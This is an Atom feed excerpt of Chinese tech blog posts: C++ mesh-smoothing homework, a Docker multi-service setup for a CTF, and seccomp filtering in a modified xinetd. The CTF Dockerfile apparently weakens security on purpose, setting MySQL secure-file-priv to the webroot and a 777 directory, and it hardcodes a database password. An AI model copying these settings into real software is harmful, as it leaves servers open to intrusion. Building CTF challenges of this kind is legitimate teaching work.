class="title">ReaderWriterT</span>&lt;Mesh&gt;:</span>:ogl_writer2(<span class="keyword">bool</span> _orient, <span class="keyword">bool</span> _smooth)&#123;<span class="comment">////在里面把三角面片法向画出</span></span><br><span class="line">  HalfedgeHandle       cshh;</span><br><span class="line">  Mesh::FacetIterator  fit(mesh_-&gt;facet_begin());</span><br><span class="line"></span><br><span class="line">    <span class="comment">//glShadeModel(GL_FLAT);</span></span><br><span class="line">    glShadeModel(GL_SMOOTH);</span><br><span class="line">    <span class="keyword">int</span> orient = <span class="literal">true</span>;<span class="comment">// (_orient) ? 1 : -1; </span></span><br><span class="line">    mesh_-&gt;update_normals();<span class="comment">//计算面法向和点法向</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (; fit != mesh_-&gt;facet_end(); ++fit) &#123;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> ((*fit).status_.is_deleted()) <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">      cshh = fit-&gt;halfedge_handle_;</span><br><span class="line">      FacetHandle fh = mesh_-&gt;facet_handle(cshh);</span><br><span class="line">      <span class="keyword">const</span> VertexHandle&amp; vh0 = mesh_-&gt;vertex_handle(cshh);</span><br><span class="line">      glColor3f(<span class="number">1.0</span>, <span class="number">0.0</span>, <span class="number">0.0</span>);</span><br><span class="line">      glBegin(GL_LINES);</span><br><span class="line">      <span class="keyword">do</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> VertexHandle&amp; vh = mesh_-&gt;vertex_handle(cshh);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//glNormal3fv(mesh_-&gt;normal(fh)*orient);</span></span><br><span class="line">        <span class="comment">//glVertex3fv(mesh_-&gt;coord(vh));</span></span><br><span class="line">        cshh = mesh_-&gt;next_halfedge_handle(cshh);</span><br><span class="line">        </span><br><span class="line">        glVertex3fv(mesh_-&gt;calc_centroid(fh));</span><br><span class="line">        glVertex3fv(mesh_-&gt;calc_centroid(fh) + mesh_-&gt;normal(fh));</span><br><span class="line">      &#125; <span class="keyword">while</span> (cshh != fit-&gt;halfedge_handle_);</span><br><span class="line">      glEnd();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>效果如下:</p><p><img src="https://qiniu.karlrixon.cn/blog/181029/3FF0CJmga7.png?imageslim" alt="mark">  </p><h2 id="task4"><a href="#task4" class="headerlink" title="task4"></a>task4</h2><blockquote><p>实现一种简单的三角网格去噪算法（例如拉普拉斯光顺）；30分</p></blockquote><p>此函数声明为：void Laplacian_Smoothing();//////////////////实现一种三角网格去噪算法<br>Tips: 可以参照已经实现的两个去噪算法；按键盘上”b”可以查看去噪结果。</p><p>代码如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span>&lt;<span class="class"><span class="keyword">class</span> <span class="title">ExItems</span>&gt;</span></span><br><span class="line"><span class="class"><span class="title">void</span> <span class="title">ExKernelT</span>&lt;ExItems&gt;:</span>:Laplacian_Smoothing()&#123;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/////请实现自己的去噪算法////////</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">int</span> vertex_num = vertex_size();</span><br><span class="line">  <span class="keyword">int</span> iterations;</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">"Input laplacian vertex update iterations(5-30次): "</span>;</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">cin</span> &gt;&gt; iterations;</span><br><span class="line">  <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">"由于迭代，比较耗时！"</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">"Please wait.....  "</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">  <span class="keyword">clock_t</span> t1 = clock();</span><br><span class="line">  <span class="keyword">do</span> &#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;Coord&gt; updateVertexPosition;</span><br><span class="line">    updateVertexPosition.resize(vertex_num);</span><br><span class="line">    VertexIterator vi(vertex_begin());</span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>; vi != vertex_end(); vi++) &#123;</span><br><span class="line">      HalfedgeHandle&amp; hh = vi-&gt;halfedge_handle_;</span><br><span class="line">      HalfedgeHandle css(opposite_halfedge_handle(hh));</span><br><span class="line">      <span class="keyword">int</span> j = <span class="number">0</span>;</span><br><span class="line">      <span class="comment">//Coord cd(0, 0, 0);</span></span><br><span class="line">      <span class="keyword">do</span> &#123;</span><br><span class="line">        updateVertexPosition[i] += coord(vertex_handle(css));</span><br><span class="line">        <span class="comment">//cd += coord(vertex_handle(css));</span></span><br><span class="line">        j++;</span><br><span class="line">        css = opposite_halfedge_handle(prev_halfedge_handle(css));</span><br><span class="line">      &#125; <span class="keyword">while</span> (opposite_halfedge_handle(css) != hh);</span><br><span class="line">      updateVertexPosition[i] /= j;</span><br><span class="line">      i++;</span><br><span class="line">      <span class="comment">//updateVertexPosition.push_back(cd/j);</span></span><br><span class="line">    &#125;</span><br><span class="line">    i = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">//std::vector&lt;Coord&gt;::iterator vpi = updateVertexPosition.begin();</span></span><br><span class="line">    <span class="keyword">for</span> (vi = vertex_begin(); vi != vertex_end(); vi++) &#123;</span><br><span class="line">      vi-&gt;coord_ = updateVertexPosition[i];</span><br><span class="line">      i++;</span><br><span class="line">      <span class="comment">//vpi++;</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">while</span> (--iterations);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">clock_t</span> t2 = clock();</span><br><span class="line">  <span class="comment">//t2 = (t2-t1)/CLOCKS_PER_SEC;</span></span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">"The time of laplacian vertex updating: "</span> &lt;&lt; (t2 - t1)*<span class="number">1.0</span> / CLOCKS_PER_SEC &lt;&lt; <span class="string">"s"</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>效果如下：<br>去噪前<img src="https://qiniu.karlrixon.cn/blog/181029/kagkgc82Eb.png?imageslim" alt="mark">去噪后<img src="https://qiniu.karlrixon.cn/blog/181029/b8ED4jA0lE.png?imageslim" alt="mark"></p><h2 id="task5"><a href="#task5" class="headerlink" title="task5"></a>task5</h2><blockquote><p>（可选/可做可不做）实现一种基于三角网格的操作（例如，特征提取，三角网格分割，三角网格变形等等）；20分</p></blockquote><p>此函数声明为: void mesh_process();</p><p>思路：先求出一个点的一环邻接顶点，将每个点到该顶点的向量相加，将算得的向量加到该点原坐标上得到新坐标。步骤是先计算每个点的新坐标，存储到容器，然后统一修改程序中mesh的顶点数据。</p><p>代码如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span>&lt;<span class="class"><span class="keyword">class</span> <span class="title">ExItems</span>&gt;</span></span><br><span class="line"><span class="class"><span class="title">void</span> <span class="title">ExKernelT</span>&lt;ExItems&gt;:</span>:mesh_process()&#123;<span class="comment">///////(可选，在三角网格上实现一种操作，例如特征提取，网格分割，三角网格变形等等)</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">int</span> vertex_num = vertex_size();</span><br><span class="line">  <span class="keyword">int</span> iterations;</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">"Input sharpening vertex update iterations(1-30次): "</span>;</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">cin</span> &gt;&gt; iterations;</span><br><span class="line">  <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">"由于迭代，比较耗时！"</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">"Please wait.....  "</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">  <span class="keyword">clock_t</span> t1 = clock();</span><br><span class="line">  <span class="keyword">do</span> &#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;Coord&gt; updateVertexPosition;</span><br><span class="line">    updateVertexPosition.resize(vertex_num);</span><br><span class="line">    VertexIterator vi(vertex_begin());</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; vi != vertex_end(); vi++) &#123;</span><br><span class="line">      HalfedgeHandle&amp; hh = vi-&gt;halfedge_handle_;</span><br><span class="line">      HalfedgeHandle css(opposite_halfedge_handle(hh));</span><br><span class="line">      <span class="keyword">int</span> j = <span class="number">0</span>;</span><br><span class="line">      <span class="comment">//Coord cd(0, 0, 0);</span></span><br><span class="line">      <span class="keyword">do</span> &#123;</span><br><span class="line">        updateVertexPosition[i] += coord(vertex_handle(css));</span><br><span class="line">        <span class="comment">//cd += coord(vertex_handle(css));</span></span><br><span class="line">        j++;</span><br><span class="line">        css = opposite_halfedge_handle(prev_halfedge_handle(css));</span><br><span class="line">      &#125; <span class="keyword">while</span> (opposite_halfedge_handle(css) != hh);</span><br><span class="line">      updateVertexPosition[i] -= coord(vertex_handle(hh))*j;</span><br><span class="line">      updateVertexPosition[i] *= <span class="number">-1</span>;</span><br><span class="line">      i++;</span><br><span class="line">      <span class="comment">//updateVertexPosition.push_back(cd/j);</span></span><br><span class="line">    &#125;</span><br><span class="line">    i = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">//std::vector&lt;Coord&gt;::iterator vpi = updateVertexPosition.begin();</span></span><br><span class="line">    <span class="keyword">for</span> (vi = vertex_begin(); vi != vertex_end(); vi++) &#123;</span><br><span class="line">      vi-&gt;coord_ += updateVertexPosition[i]*<span class="number">0.1</span>;</span><br><span class="line">      i++;</span><br><span class="line">      <span class="comment">//vpi++;</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">while</span> (--iterations);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">clock_t</span> t2 = clock();</span><br><span class="line">  <span class="comment">//t2 = (t2-t1)/CLOCKS_PER_SEC;</span></span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">"The time of sharpening vertex updating: "</span> &lt;&lt; (t2 - t1)*<span class="number">1.0</span> / CLOCKS_PER_SEC &lt;&lt; <span class="string">"s"</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>效果如下：</p><p>原始图形<img src="https://qiniu.karlrixon.cn/blog/181029/D4LKhgkkdi.png?imageslim" alt="mark"><img src="https://qiniu.karlrixon.cn/blog/181109/eE8bBdcl4L.png?imageslim" alt="mark"><br>去噪后<img src="https://qiniu.karlrixon.cn/blog/181109/3b9c2im837.png?imageslim" alt="mark"><img src="https://qiniu.karlrixon.cn/blog/181109/6ll9hEAIHb.png?imageslim" alt="mark"><br>变形后<img src="https://qiniu.karlrixon.cn/blog/181109/f476cgEAhE.png?imageslim" alt="mark"><img src="https://qiniu.karlrixon.cn/blog/181109/74jl6gbh05.png?imageslim" alt="mark"></p><h2 id="思路总结-amp-遇到的问题"><a href="#思路总结-amp-遇到的问题" class="headerlink" title="思路总结&amp;遇到的问题"></a>思路总结&amp;遇到的问题</h2><p>task1中海伦公式注意p表示半周长</p><p>task2中的计算顶点法向的思想是将相邻的所有面片法向相加</p><p>task3使用面片迭代器，调用函数算出三角形中心和法向，使用 <code>glBegin(LINES)</code>画线</p><p>task4要首先算出所有点在一环邻接顶点作用下的正确位置（即邻接顶点相加除以邻接顶点个数），然后统一修改mesh中顶点数据。这里存储所有顶点新位置用到了容器，使用时要注意先给容器分配空间，而且容器下标从0开始，不然会报错容器下标越界</p><p>task5在task4的基础上以另一种方法修改了顶点位置实现一种新的网格变换操作必要时可以自己向内核代码添加一些函数</p>]]></content>
        <author>
            <name><![CDATA[KarlRixon’s Blog]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://doublemice.github.io/%E5%A0%86%E5%88%A9%E7%94%A8%E5%8F%98%E8%BF%81-glibc-2.25/</id>
        <title><![CDATA[堆利用变迁 Glibc<2.25]]></title>
        <updated>2018-10-25T00:00:00+08:00</updated>
        <link href="https://doublemice.github.io/%E5%A0%86%E5%88%A9%E7%94%A8%E5%8F%98%E8%BF%81-glibc-2.25/"/>
        <content type="text/html" src="https://doublemice.github.io/%E5%A0%86%E5%88%A9%E7%94%A8%E5%8F%98%E8%BF%81-glibc-2.25/"><![CDATA[堆利用变迁 Glibc<2.25]]></content>
        <author>
            <name><![CDATA[DoubleMice]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://www.summershrimp.com/2018/08/run-multi-service-in-one-container/</id>
        <title><![CDATA[如何科学的在Docker Container中运行多个服务]]></title>
        <updated>2018-08-25T13:29:15+08:00</updated>
        <link href="https://www.summershrimp.com/2018/08/run-multi-service-in-one-container/"/>
        <content type="text/html" src="https://www.summershrimp.com/2018/08/run-multi-service-in-one-container/"><![CDATA[<p>在一个Docker Container中运行多个服务？打扰了。</p>
<h1>0x00 前言</h1>
<p>Docker，或说任何基于<code>内核namespace</code>的轻量级进程隔离技术，在设计之初，都不是为了当作虚拟机使用的。也就是说，其中运行的并不是一个完整的操作系统。包括Docker官方，也是推荐在一个Container内仅运行一个服务。如果需要运行多个服务，应通过<code>docker run --link</code> 或者<code>docker-compose</code>来关联多个容器。但是在实际的应用中，我们经常希望将一个完整的可运行环境打包成一个<code>docker image</code>，不再依赖其他的容器。比如在CTF比赛中，将多个服务打包成一个Image，可以有效地提高在环境受损后恢复的效率。在经历了多场比赛，看过各种大师傅用各种奇怪的姿势完成这个任务后，觉得应该好好的讨论一下这个问题。</p>
<h1>0x01 错误的姿势</h1>
<ol>
<li>使用upstart的启动方式</li>
</ol>
<pre><code># Dockerfile
From ubuntu:14.04
RUN apt-get update &amp;&amp; apt-get upgrade -y &amp;&amp; apt-get install mysql apache2 php7.0 
ADD web /var/www/html
RUN service mysql start &amp;&amp; /var/www/html/init_sql.sh &amp;&amp; service mysql stop
CMD service mysql start &amp;&amp; service apache2 start &amp;&amp; while true; do sleep 10;done
</code></pre>
<ol>
<li>使用systemd的启动方式</li>
</ol>
<pre><code># Dockerfile
From ubuntu:16.04
RUN apt-get update &amp;&amp; apt-get upgrade -y &amp;&amp; apt-get install mysql apache2 php7.0 
ADD web /var/www/html
RUN systemctl start mysql &amp;&amp; /var/www/html/init_sql.sh &amp;&amp; systemctl stop mysql
CMD systemctl start mysql &amp;&amp; systemctl start apache2 &amp;&amp; while true; do sleep 10;done
</code></pre>
<ol>
<li>使用启动脚本启动多个服务</li>
</ol>
<pre><code># Dockerfile
From ubuntu:16.04
RUN apt-get update &amp;&amp; apt-get upgrade -y &amp;&amp; apt-get install mysql apache2 php7.0 
ADD web /var/www/html
ADD entrypoint.sh /sbin/
RUN chmod +x /sbin/entrypoint.sh /var/www/html/init_sql.sh&amp;&amp; \
     /etc/init.d/mysql start &amp;&amp; /var/www/html/init_sql.sh &amp;&amp; /etc/init.d/mysql stop
CMD /sbin/entrypoint.sh
</code></pre>
<pre><code>#!/bin/bash 

# entrypoint.sh
/usr/bin/mysqld start &amp;
/usr/bin/httpd &amp;
while true
do
sleep 100
done
</code></pre>
<p>在实际中，使用<code>方法1</code>或者<code>方法2</code>很大几率无法完成将多个服务跑在同一个container中的任务。<code>方法3</code>虽然可以，但仍然存在一些问题：</p>
<ol>
<li>一旦产生僵尸进程，将无人回收，只有杀掉整个container才能解决。</li>
<li>在停止container的时候将无人处理<code>SIGTERM</code>等信号。</li>
<li>很难重启其中某一个服务</li>
</ol>
<p><code>方法1</code>和<code>方法2</code>不能成功，是因为docker只是一个进程隔离的沙箱环境，并不是真正的虚拟机。而<code>service xxx start</code> 和<code>systemctl start xxx</code> 分别是<code>upstart</code>和<code>systemd</code>这两个<code>/sbin/init</code>进程的替代者的服务管理命令。而<code>upstart</code>和<code>systemd</code>都要求系统必须是物理机或虚拟机，并不支持作为container的<code>init</code>进程。方法3存在问题是因为，在正常的系统中，<code>init</code>进程永远占用<code>PID=1</code>的位置，回收僵尸进程、处理未处理的信号等都是由<code>init</code>进程帮我们完成的，一个子进程如果失去了父进程，也会由<code>init</code>进程接管。但是在container中，<code>init</code>进程并不存在，<code>PID=1</code>的进程是我们在<code>Dockerfile</code>中定义的<code>Entrypoint</code>或最后一个<code>CMD</code>指定的命令。</p>
<pre><code>root@vpscn:/var/lib/docker# docker exec -it hackmd sh
/hackmd # ps -ef
PID   USER     TIME   COMMAND
    1 hackmd     1:03 node app.js
   42 hackmd     0:00 /usr/local/bin/node ./lib/workers/dmpWorker.js
   62 root       0:00 sh
   69 root       0:00 ps -ef
</code></pre>
<p>因此，对于启动方法3的container，我们应该在启动时加上<code>--init</code>参数，来强制使用<a href="https://github.com/krallin/tini">tini</a>作为<code>init</code>进程。但是就算这样，在服务多了之后，进行重启等操作仍然很繁琐。</p>
<h1>0x02 推荐的姿势</h1>
<p>作为一个~~金牌运维~~打杂的，简单谈谈我常用的方法。</p>
<p>首先推荐一个超级好用的基础镜像<code>phusion/baseimage</code>。截至SUCTF2018环境准备完成时，该镜像的最新版本是<code>0.10.1</code>，基于<code>ubuntu 16.04</code>。我们常用的<code>apt-get</code>等命令都可以无缝兼容。<a href="https://github.com/phusion/baseimage-docker">phusion/baseimage</a> 采用了作者自己开发的一个基于<code>python</code>的<code>init</code>进程作为Container的<code>Entrypoint</code>，采用<code>runit</code>作为服务管理器。这个基础镜像还是在Coding打杂的时候知道的，<a href="https://studio.coding.net">Coding ~~WebIDE~~ Studio</a> 的Web Terminal也是基于这个镜像做的。NUAACTF/SUCTF的PWN题基础镜像<a href="https://github.com/Asuri-Team/ctf-xinetd">ctf-xinetd</a>也是基于这个镜像做的。</p>
<p>然后直接贴个在SUCTF2018运维期间写的<code>Dockerfile</code></p>
<pre><code>#Dockerfile
FROM phusion/baseimage:0.10.1
MAINTAINER Yibai Zhang &lt;xm1994@outlook.com&gt;

RUN sed -i 's/archive.ubuntu.com/mirrors.aliyun.com/g' /etc/apt/sources.list &amp;&amp;\
    sed -i 's/security.ubuntu.com/mirrors.aliyun.com/g' /etc/apt/sources.list &amp;&amp;\
    apt-get update &amp;&amp; apt-get install -y apache2 libapache2-mod-php php-mysql mariadb-server &amp;&amp;\
    apt-get clean &amp;&amp; rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/* /var/www/html/*

RUN mkdir -p /etc/service/apache2/ &amp;&amp; \
    printf "#!/bin/sh\n\ntrap \"apachectl -k graceful-stop\" 1 2 3 6 15\n\nexec /usr/sbin/apachectl -D FOREGROUND\n" &gt; /etc/service/apache2/run &amp;&amp;\
    chmod +x /etc/service/apache2/run &amp;&amp; mkdir -p /etc/service/mysql/ &amp;&amp;\
    printf "#!/bin/sh\n\ntrap \"mysqladmin -uroot -psuCTF_P1us_1s shutdown\" 1 2 3 6 15\n\nexec /usr/bin/mysqld_safe" &gt; /etc/service/mysql/run &amp;&amp;\
    mkdir -p /var/run/mysqld/ &amp;&amp; chown mysql:mysql /var/run/mysqld &amp;&amp;\
    chmod 700 /etc/service/mysql/run /etc/service/apache2/run

COPY web /var/www/html
COPY flag /flag
RUN echo "secure-file-priv=/var/www/" &gt;&gt;/etc/mysql/mariadb.conf.d/50-server.cnf &amp;&amp; chmod -R 777 /var/www/html/favicon
COPY init_sql.sh /tmp/init_sql.sh
RUN chmod +x /tmp/init_sql.sh &amp;&amp; bash -c "/tmp/init_sql.sh" &amp;&amp; rm /tmp/init_sql.sh
EXPOSE 80
</code></pre>
<pre><code>#!/usr/bin/env bash
#init_sql.sh

mysqld_safe &amp;   
echo -n "Waiting for mysql startup"
while ! mysqladmin --host="localhost" --silent ping ; do
    echo -n "."
    sleep 1
done
echo

mysql -uroot &lt;&lt;EOF
UPDATE mysql.user SET Password=PASSWORD('XXXXXX'), plugin = '' WHERE User='root';
create database calc;
use calc;
create table user(
id INT NOT NULL AUTO_INCREMENT primary key,
username varchar(32) NOT NULL,
password varchar(32) NOT NULL
)ENGINE=InnoDB DEFAULT CHARSET=utf8;
insert into user values(1,'admin','aa67095d8e65d624548cb6b50bd4778e');
create table file(
id INT NOT NULL AUTO_INCREMENT primary key,
filename varchar(32) NOT NULL,
filehash varchar(32) NOT NULL,
sig varchar(120) NOT NULL
)ENGINE=InnoDB DEFAULT CHARSET=utf8;
create table flag(
flag varchar(120) primary key
)ENGINE=InnoDB DEFAULT CHARSET=utf8;
insert into flag values('SUCTF{a_very_long_long_long_long_long_fake_flag_d}');
grant SELECT, INSERT on calc.user to 'suctf'@localhost identified by 'suctf';
grant SELECT, INSERT, UPDATE on calc.file to 'suctf'@localhost ;
grant SELECT on calc.flag to 'suctf'@localhost ;
FLUSH PRIVILEGES;
EOF

mysqladmin -uroot -pXXXXXX shutdown
</code></pre>
<p>这里着重看一下<code>printf "#!/bin/sh\n\ntrap \"apachectl -k graceful-stop\" 1 2 3 6 15\n\nexec /usr/sbin/apachectl -D FOREGROUND\n" &gt; /etc/service/apache2/run</code>，这个命令就是在创建runit启动脚本。具体的说明可以去看<code>phusion/baseimage</code>或者<code>runit</code>的手册。执行完成后会在<code>/etc/service/apache2/run</code>下面生成如下内容的脚本</p>
<pre><code>#!/bin/sh

trap "apachectl -k graceful-stop" 1 2 3 6 15

exec /usr/sbin/apachectl -D FOREGROUND
</code></pre>
<p>这个脚本会作为runit的子进程运行，并将Apache2保持在前台运行。在接收到<code>1 2 3 6 15</code>这几个信号的时候友好的(graceful)结束Apache2。如果在运行中需要重启Apache服务，只需要运行<code>docker exec container_name sv restart apache2</code>即可。通过这种方式，在Container停止的时候也可以通知相关的进程，而不是直接全部杀死，更可以保证服务的完整性。~~虽然在比赛中基本挂了就要恢复环境根本不需要保证完整性。~~</p>]]></content>
        <author>
            <name><![CDATA[0xe799bde88f9c]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://www.summershrimp.com/2018/05/xinetd-kafel/</id>
        <title><![CDATA[xinetd-kafel – 一个更安全的xinetd服务]]></title>
        <updated>2018-05-12T13:26:27+08:00</updated>
        <link href="https://www.summershrimp.com/2018/05/xinetd-kafel/"/>
        <content type="text/html" src="https://www.summershrimp.com/2018/05/xinetd-kafel/"><![CDATA[<p>为了保证CTF解题/渗透赛中PWN服务有更稳定的表现（预防搅屎棍）和CTF攻防赛中有人使用ptrace/seccomp等系统调用做通用防御，我在xinetd中加入了对syscall的过滤。感谢Google的Kafel项目，给编写seccomp bpf代码提供了一种更方便的方法。</p>
<h1>0x00 前言：为啥要搞这个东西？</h1>
<p>众所周知，在CTF线下赛中，各大主办方明令禁止使用通用防御软件/规则对赛题进行防御。但是目前在国内外的各大比赛中，PWN题目多用socat或xinetd提供服务。而这两个组建都太过简陋，无法提供精细的系统调用控制，主办方对通防工具的检查多为人工登陆gamebox检查。<br />
在近日结束的一场线下赛中，某战队向我反馈成功的使用了我在去年编写的一个<a href="https://github.com/Asuri-Team/pwn-sandbox">PWN通防工具</a>苟到了最后（关于这个工具的原理如果有兴趣欢迎star一下对应项目，人数多的话我会再开坑写文章）。<br />
我也惊讶于主办方竟然对这么大型的通防工具都没有察觉。</p>
<p>而在CTF解题赛/渗透赛中，虽然有docker这一容器技术可以为pwn题目隔离运行环境，限制运行资源，方便重启等维护工作，但依然难以避免有部分搅屎选手采用诸如<a href="https://zh.wikipedia.org/wiki/Fork%E7%82%B8%E5%BC%B9">Fork炸弹</a>等手段对服务器进行DoS攻击。<br />
因此，对一些用不到的的系统调用进行限制，也可以大大减少搅屎棍选手的数量。（Docker已直接支持对container内程序进行系统调用限制<a href="https://docs.docker.com/engine/security/seccomp/">Read More</a>）</p>
<p>因此，<a href="https://github.com/Asuri-Team/xinetd-kafel">xinetd-kafel</a>这一改版的xinetd服务油然而生。</p>
<h1>0x01 原理：你对xinetd做了点啥？</h1>
<p>其实修改xinetd让其支持对系统调用的过滤这一想法最早在Defcon 2015 Final时就已被其主办方实现。但主办方并未开源其xinetd代码（也可能是我没找到），而且其只能在xinetd的配置文件中对syscall进行简单的黑白名单过滤，难以有效限制日渐增长的搅屎大军。<br />
让程序支持syscall过滤通常来讲有两种办法：<br />
1. ptrace<br />
2. seccomp<br />
其中，ptrace就是linux下gdb用来调试程序所使用的syscall，而且其功能如其名，process trace， 用于跟踪进程的各种调用。<br />
但是由于ptrace使用过于复杂，我们在xinetd中，并未使用这一方式，而采用了seccomp。</p>
<h2>seccomp是个啥？</h2>
<p><code>seccomp - operate on Secure Computing state of the process</code><br />
seccomp 中文直译就是“操作进程的安全计算状态”，其实就是通知内核对进程的系统调用进行限制。几年前CentOS/RedHat Linux默认启用的selinux底层就是使用的这个系统调用对进程进行系统调用限制。当年应该人人装完linux的第一件事就是关掉selinux。现在的Ubuntu和CentOS都已不再默认安装或开启selinux了。<br />
通过<code>man seccomp</code>我们就能看到seccomp的相关调用方法。</p>
<pre><code>prctl(PR_SET_SECCOMP, SECCOMP_MODE_XX, args);
seccomp(SECCOMP_MODE_XX, flags, args);
</code></pre>
<p>linux Man page对seccomp的描述非常有歧义，其提供了如上两种接口，这里我把其参数相应的对应了起来。<code>seccomp</code>的第二个参数flags很难查到相关资料，而且在我们的场景下并不影响使用，就不再多做解释。seccomp调用会对当前进程及其子进程生效，如果我们调用seccomp之后，当前进程的系统调用就会被限制。</p>
<p><code>SECCOMP_MODE_XX</code>共有两种选择：<br />
1. SECCOMP_MODE_STRICT<br />
2. SECCOMP_MODE_FILTER</p>
<p><code>SECCOMP_MODE_STRICT</code> 会将系统调限制在 <code>read, write, _exit (but not exit_group), sigreturn</code>中。 我们可以编写一个小程序测试一下：</p>
<pre><code>#include &lt;stdio.h&gt;
#include &lt;linux/seccomp.h&gt;
#include &lt;linux/filter.h&gt;
#include &lt;linux/audit.h&gt;
#include &lt;linux/signal.h&gt;
#include &lt;sys/prctl.h&gt;
#include &lt;unistd.h&gt;

int main(void)
{
    puts("a");
    prctl(PR_SET_SECCOMP, SECCOMP_MODE_STRICT, 0);
    puts("b");
    system("echo c");
    return 0;
}
</code></pre>
<p>编译运行后结果如下：</p>
<pre><code>xm1994@xm1994-vm:~$ ./a.out 
a
b
Killed
</code></pre>
<p>程序在执行到system函数后就提示了Killed。这是因为在执行system时，会调用fork和execve两个系统调用。<br />
如果我们删掉system()函数后再运行呢？程序依然会提示killed。这个问题是由于在新版的libc中，main函数退出后。libc_start_main会调用exit_group(0)结束程序以及其子进程（感觉是为了防止僵尸进程？），但再旧版的libc中，执行的是exit()。</p>
<p><code>SECCOMP_MODE_FILTER</code> 模式则允许传入一个过滤器参数，进行自定义的系统调用过滤。</p>
<h2>这过滤器咋搞啊？</h2>
<p>seccomp使用的过滤器叫<a href="https://zh.wikipedia.org/wiki/BPF">BPF</a>, 允许在内核中直接设置数据包过滤模式。 我们使用wireshark/tcpdump进行网络抓包时，设置的抓包规则就会被编译成bpf送入内核。在内核中，系统调用流程也会反映在网络数据包（特殊的）的处理流程中（还有很多其他的系统事件也会以数据包的形式存在）。因此，我们也可以通过编译bpf规则到内核中，来自定义seccomp的过滤规则。</p>
<pre><code> struct sock_fprog {
    unsigned short      len;    /* Number of BPF instructions */
